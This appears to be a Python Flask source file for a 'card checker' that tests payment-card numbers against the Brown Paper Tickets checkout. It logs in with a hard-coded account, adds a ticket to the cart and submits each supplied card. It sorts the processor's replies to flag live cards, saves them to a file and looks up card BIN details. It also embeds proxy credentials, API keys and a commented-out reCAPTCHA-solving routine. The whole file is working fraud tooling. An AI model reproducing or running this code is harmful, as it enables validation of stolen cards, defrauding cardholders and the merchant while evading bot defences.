import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

# def criarTask():
#     data = {
#         "clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39",
#         "task": {
#             "type": "RecaptchaV2EnterpriseTask",
#             "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
#             "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
#         },
#     }
#     criar = requests.post(
#         "https://api.capmonster.cloud/createTask", verify=False, json=data
#     )
#     taskId = criar.json()["taskId"]
#     while True:
#         data = {"clientKey": "86f80f989d5d3d9f84ed15a70dcd8a39", "taskId": taskId}
#         resultado = requests.post(
#             "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
#         )
#         #print(resultado.text)
#         if '"status":"ready"' in resultado.text:
#             return resultado.json()["solution"]["gRecaptchaResponse"]
#         time.sleep(1)

def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    
    
def checker(card, month, year, cvv):

        
        try:
            
            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225'}
            
            if len(year) == 4:
                year = year[2:]
 
 
 
            url = "https://www.brownpapertickets.com/index.html"
            payload = {}
            headers = {
            'Host': 'www.brownpapertickets.com',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://www.brownpapertickets.com/checkout.html',
            'Accept-Language': 'pt-PT,pt;q=0.9',
            #'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; client_secure="8nPuHrcJEZDRs7W"; _gat_UA-114148720-1=1; bpt="nAGY.nAGYgMDK-1712790582730"; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790582.24.0.0; _ga=GA1.1.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790582.0.0.0'
            }

            response = requests.request("GET", url, headers=headers, data=payload, verify=False)
            email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
            password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
            bpt = response.cookies.get('bpt')
            print(response.headers)
            print(response.cookies)
            

            url = "https://www.brownpapertickets.com/login.html"
            payload = f'{email_id}=suor_jose2daislv%40gmail.com&not_a_valid_field=Password&{password}=radask10'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/index.html',
                'Accept-Language': 'pt-PT,pt;q=0.9',
                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; _gat_UA-114148720-1=1; client_secure="CEZzL2De6JDbXn3"; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790394.38.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790400.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }

            response = requests.request("POST", url, headers=headers, data=payload, verify=False)
            client_secure = response.headers.get('client_secure')
            
      
      


            url = "https://www.brownpapertickets.com/addtocart/6286439"
            payload = 'event_id=6286439&date_id=2404827&price_7646712=1&country_id=228&shipping_2404827=4'
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/event/6286439',
                'Accept-Language': 'pt-PT,pt;q=0.9',
                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790490.55.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790499.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False)


 
 
 
            url = "https://www.brownpapertickets.com/checkout.html"
            payload = f'payment_method=&final=1&browserinfo=24.false.1080.1920&attendee_fname=james&attendee_lname=desn&email=suor_jose2daislv%40gmail.com&phone=6612147345&terms=t&billing_fname=james&billing_lname=dean&billing_address=23937%20Rancho%20Ct&billing_address_2=&billing_city=Valencia&billing_state=CA&billing_province=&billing_zip=91354&billing_country=United%20States&type=Visa&number={card}&code=222&expiry_month={month}&expiry_year={year}&issue_month=&issue_year=&issue_number='
            headers = {
                'Host': 'www.brownpapertickets.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.brownpapertickets.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.brownpapertickets.com/checkout.html',
                'Accept-Language': 'pt-PT,pt;q=0.9',
                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; bpt={bpt}; client_secure={client_secure}; _gat_UA-114148720-1=1; _ga=GA1.1.1494828109.1712786777; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790502.43.0.0; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790542.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False)
 
            if "Redirection" in response.text:
                raise RequisicaoException()
                
                    
            if 'Invalid transaction' in response.text:
                #code = response.json()['issuerResponseDetails']['issuerResponseCode']
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                          
                open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker")  
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
                
            elif 'Insufficient funds' in response.text:
                bin = api_bin(card[:6])              
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF"                          
                open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF #JacaChecker\n") 
                print(Fore.GREEN + f"{x} #JacaChecker")  
                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                

                    
            elif 'The error returned by the credit card processor was' in response.text:
                response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
                bin = api_bin(card[:6])
                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response}"     
                print(Fore.RED + f"{x} #JacaChecker")  
                return {"code": 1, "mensagem": f"{x} #JacaChecker<br>"}                        

            else:
            # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
                print(Fore.RED + 'Gateway Timeout' )
                return {"code": 1, "mensagem": "Gateway Timeout #JacaChecker<br>"} 


                        
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
        except RequisicaoException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO 302: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = reteste(card,mes,ano,cvv)
        return {"code": "", "retorno": "EXCEPTION ! CONTATE ADM SE PERSISTIR"}
    
    
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

